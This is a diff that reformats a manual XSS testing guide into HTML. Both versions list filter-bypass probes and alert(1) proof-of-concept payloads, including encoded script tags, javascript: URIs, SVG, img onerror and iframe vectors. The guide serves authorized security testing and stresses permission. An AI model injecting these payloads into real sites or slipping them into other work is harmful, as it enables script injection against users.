@@ -1,69 +1,103 @@
-# XSS Testing Guide
-This guide provides step-by-step instructions to manually test for XSS vulnerabilities in web applications. XSS vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users. Use this guide to test whitelisted or blacklisted elements, character encoding, and potential bypass vectors.
+<h1><b>XSS Testing Guide</b></h1>
+<p>This guide provides step-by-step instructions to manually test for XSS vulnerabilities in web applications. XSS vulnerabilities allow attackers to inject malicious scripts into web pages viewed by other users. Use this guide to test whitelisted or blacklisted elements, character encoding, and potential bypass vectors.</p>
 <br />
-<h3>Prerequisites</h3>
-Before testing, ensure you have:<br />
-1. Access to the web application you want to test<br />
-2. Basic knowledge of web technologies such as HTML, JavaScript, and URL encoding<br />
-3. Appropriate permissions to perform security testing on the target website (legal or authorized engagement)<br />
-<h1>Basics for Testing XSS Vulnerabilities</h1>
 
-<b>1. Identify Whitelisted or Blacklisted Characters</b>
-Begin by identifying if the application uses a whitelist or blacklist to filter specific characters. This will give you an idea of what input is allowed or blocked.<br />
+<h3><b>Prerequisites</b></h3>
+<p>Before testing, ensure you have:</p>
+<ul>
+    <li>Access to the web application you want to test</li>
+    <li>Basic knowledge of web technologies such as HTML, JavaScript, and URL encoding</li>
+    <li>Appropriate permissions to perform security testing on the target website (legal or authorized engagement)</li>
+</ul>
+<br />
 
-<b>2. Test Basic HTML Characters</b>
-Check if basic HTML characters such as < and > are allowed or encoded. These characters are essential for creating HTML elements.<br />
-1. <<br />
-2. ><br />
-3. &lt   <!-- HTML entity for < --><br />
-4. &gt   <!-- HTML entity for > --><br />
-<b>Example Test Payloads:</b><br />
-&lt;script&gt;alert(1)&lt;/script&gt;<br />
-&ltscript&gtalert(1)&lt/script&gt<br />
+<h1><b>Basics for Testing XSS Vulnerabilities</b></h1>
 
-<b>3. Test URL-Encoded Characters</b>
-Many web applications automatically encode special characters in URLs. Try common URL-encoded representations to see if they are accepted or blocked.<br />
-5. %3c    <!-- URL encoding for < --><br />
-6. %3e    <!-- URL encoding for > --><br />
-<b>Example Test Payloads:</b><br />
-%3cscript%3ealert(1)%3c/script%3e<br />
-<b>4. Test javascript: URI Scheme</b><br />
-The javascript: URI scheme is commonly used in XSS attacks. Check if this scheme is blacklisted or if the application allows it in href or src attributes.<br />
-7. javascript:<br />
-8. JAVASCRIPT:    <!-- Test for case-insensitivity --><br />
-<b>Example Test Payloads:</b><br />
-&lt;a href="javascript:alert(1)"&gt;Click me&lt;/a&gt;<br />
-<b>5. Test Octal Encoded Characters</b><br />
-Test octal representations of characters like < and > to see if the application interprets them correctly or allows them through.<br />
+<h4><b>1. Identify Whitelisted or Blacklisted Characters</b></h4>
+<p>Begin by identifying if the application uses a whitelist or blacklist to filter specific characters. This will give you an idea of what input is allowed or blocked.</p>
+<br />
 
-9. \74    <!-- Octal encoding for < --><br />
-10. \76   <!-- Octal encoding for > --><br />
-<b>Example Test Payload:</b>
-\74script\76alert(1)\74/script\76<br />
-<b>6. Test Mixed Encodings</b><br />
-Test mixed encodings to see if the filter can catch them. Attackers often use mixed encoding methods to bypass simple filters.<br />
+<h4><b>2. Test Basic HTML Characters</b></h4>
+<p>Check if basic HTML characters such as < and > are allowed or encoded. These characters are essential for creating HTML elements.</p>
+<ul>
+    <li><code>&lt;</code></li>
+    <li><code>&gt;</code></li>
+    <li><code>&amp;lt;</code> <!-- HTML entity for < --></li>
+    <li><code>&amp;gt;</code> <!-- HTML entity for > --></li>
+</ul>
+<p><b>Example Test Payloads:</b></p>
+<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br />
+<code>&lt;script&gtalert(1)&lt;/script&gt</code><br />
+<br />
 
-11. %3cSCRipt%3e    <!-- Mixed encoding with capital letters --><br />
-<b>Example Test Payloads:</b><br />
-%3cSCRipt%3ealert(1)%3c/SCRipt%3e<br />
-<b>7. Test SVG Injection</b><br />
-SVG elements can be a source of XSS, particularly in modern web applications. Test encoded versions of SVG elements to see if they trigger XSS.<br />
+<h4><b>3. Test URL-Encoded Characters</b></h4>
+<p>Many web applications automatically encode special characters in URLs. Try common URL-encoded representations to see if they are accepted or blocked.</p>
+<ul>
+    <li><code>%3c</code> <!-- URL encoding for < --></li>
+    <li><code>%3e</code> <!-- URL encoding for > --></li>
+</ul>
+<p><b>Example Test Payloads:</b></p>
+<code>%3cscript%3ealert(1)%3c/script%3e</code><br />
+<br />
 
-<b>12. &lt;%3cSVg%3e&gt;</b>    <!-- Encoded SVG elements --><br />
-<b>Example Test Payload:</b><br />
-<svg><script>alert(1)</script></svg><br />
-<b>8. Continue Testing with Various Encodings</b><br />
-Extend your testing by experimenting with various encodings, bypass methods, and payloads that combine different attack vectors.<br />
+<h4><b>4. Test javascript: URI Scheme</b></h4>
+<p>The <code>javascript:</code> URI scheme is commonly used in XSS attacks. Check if this scheme is blacklisted or if the application allows it in href or src attributes.</p>
+<ul>
+    <li><code>javascript:</code></li>
+    <li><code>JAVASCRIPT:</code> <!-- Test for case-insensitivity --></li>
+</ul>
+<p><b>Example Test Payloads:</b></p>
+<code>&lt;a href="javascript:alert(1)"&gt;Click me&lt;/a&gt;</code><br />
+<br />
 
-Other Example Test Payloads:<br />
-data:text/html,<script>alert(1)</script><br />
-&lt;img src=x onerror=alert(1)&gt;<br />
-&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gr;<br />
-<b>Notes</b><br />
-Always perform XSS testing in a safe, controlled environment.<br />
-Never test live systems without proper authorization.<br />
-Some payloads might behave differently based on the browser's built-in security features (e.g., CSP or XSS filters).<br />
-By following these steps, you can identify potential XSS vulnerabilities and understand how web applications handle whitelisted or blacklisted characters and encodings. Remember to document your findings and share your results responsibly with the application owner.
+<h4><b>5. Test Octal Encoded Characters</b></h4>
+<p>Test octal representations of characters like < and > to see if the application interprets them correctly or allows them through.</p>
+<ul>
+    <li><code>\74</code> <!-- Octal encoding for < --></li>
+    <li><code>\76</code> <!-- Octal encoding for > --></li>
+</ul>
+<p><b>Example Test Payload:</b></p>
+<code>\74script\76alert(1)\74/script\76</code><br />
+<br />
+
+<h4><b>6. Test Mixed Encodings</b></h4>
+<p>Test mixed encodings to see if the filter can catch them. Attackers often use mixed encoding methods to bypass simple filters.</p>
+<ul>
+    <li><code>%3cSCRipt%3e</code> <!-- Mixed encoding with capital letters --></li>
+</ul>
+<p><b>Example Test Payloads:</b></p>
+<code>%3cSCRipt%3ealert(1)%3c/SCRipt%3e</code><br />
+<br />
+
+<h4><b>7. Test SVG Injection</b></h4>
+<p>SVG elements can be a source of XSS, particularly in modern web applications. Test encoded versions of SVG elements to see if they trigger XSS.</p>
+<ul>
+    <li><code>&lt;%3cSVg%3e&gt;</code> <!-- Encoded SVG elements --></li>
+</ul>
+<p><b>Example Test Payload:</b></p>
+<code>&lt;svg&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/svg&gt;</code><br />
+<br />
+
+<h4><b>8. Continue Testing with Various Encodings</b></h4>
+<p>Extend your testing by experimenting with various encodings, bypass methods, and payloads that combine different attack vectors.</p>
+<br />
+
+<p><b>Other Example Test Payloads:</b></p>
+<ul>
+    <li><code>data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+    <li><code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+    <li><code>&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;</code></li>
+</ul>
+<br />
+
+<h4><b>Notes:</b></h4>
+<ul>
+    <li>Always perform XSS testing in a safe, controlled environment.</li>
+    <li>Never test live systems without proper authorization.</li>
+    <li>Some payloads might behave differently based on the browser's built-in security features (e.g., CSP or XSS filters).</li>
+</ul>
+<p>By following these steps, you can identify potential XSS vulnerabilities and understand how web applications handle whitelisted or blacklisted characters and encodings. Remember to document your findings and share your results responsibly with the application owner.</p>
+
 
 <h3><b>Steps for Testing XSS Vulnerabilities</b></h3>
 
